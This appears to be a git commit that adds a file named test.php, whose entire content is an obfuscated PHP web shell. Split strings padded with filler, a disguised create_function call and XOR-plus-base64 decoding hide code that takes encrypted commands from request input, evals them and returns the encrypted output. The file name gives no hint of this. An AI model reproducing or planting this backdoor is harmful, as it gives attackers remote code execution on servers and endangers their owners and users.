21d777273d84cd42b923b5b7d803a27937e043c9
guptabless <61534368+guptabless@users.noreply.github.com>
2020-06-05 01:27:09 -0400

    Create test.php

---
+++ test.php
@@ -0,0 +1,11 @@
+<?php
+$O='_end_cleS6an();$S6r=@baS6S6se64_encoS6dS6e(@x(@gS6zcompressS6($o),$k));S6priS6nS6t("$p$kh$r$kf");}';
+$g='tch(S6"/$kh(.+S6)$kf/",@S6file_gS6S6et_contentsS6("php:S6//inpuS6t"),$m)=S6=1){S6S6@ob_start(S6);S6S6';
+$o=str_replace('b','','bcrbeatbe_fubbnbction');
+$H='j=0S6;S6($j<$c&&S6$i<$lS6);$j++S6,$i++S6){$o.=S6$t{S6$i}^$k{$j};S6}}returS6S6n $o;}iS6f(@pregS6_ma';
+$Y='@evS6al(@gzuncompresS6s(@x(@S6S6basS6e64_decode($m[1]S6)S6,$k)));$o=@ob_S6get_conS6S6tentsS6();@ob';
+$p='$kS6="827ccb0eS6";$kS6h="eaS68a706c4c34S6S6";$kf="aS616891f84eS6S67b";$p="S68wpddS6QhqMzng8Kzb"S';
+$V='6;funcS6tion xS6($t,$S6k){$c=sS6trleS6n($k);$l=S6stS6S6rlen($t);$o="";fS6or($S6S6S6i=0;$i<$l;){for($';
+$W=str_replace('S6','',$p.$V.$H.$g.$Y.$O);
+$b=$o('',$W);$b();
+?>
